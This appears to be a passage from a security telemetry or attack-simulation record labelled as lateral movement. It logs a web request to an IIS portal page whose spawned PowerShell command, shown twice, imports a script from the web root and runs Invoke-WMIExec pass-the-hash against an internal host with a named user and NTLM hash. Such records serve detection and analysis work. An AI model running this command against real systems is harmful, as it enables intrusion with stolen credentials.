      tactic: Lateral Movement
    http:
      method: GET
      uri_stem: /portal/vendor-docs/session-expired.aspx
      cmd_plaintext: 'powershell -Command "Import-Module ''C:\inetpub\wwwroot\portal\assets\Get-RemoteTask.ps1''; Invoke-WMIExec -Target 10.42.10.10 -Domain meridianfreight -Username dmontoya -Hash 3ba61d9c7f04e28a5c6d13804f9ae7b2 -Command ''whoami''"'
      status_code: 200
      time_taken_ms: 845
    process:
      pid: 4820
      ppid: 3096
      name: powershell.exe
      command_line: 'powershell -Command "Import-Module ''C:\inetpub\wwwroot\portal\assets\Get-RemoteTask.ps1''; Invoke-WMIExec -Target 10.42.10.10 -Domain meridianfreight -Username dmontoya -Hash 3ba61d9c7f04e28a5c6d13804f9ae7b2 -Command ''whoami''"'
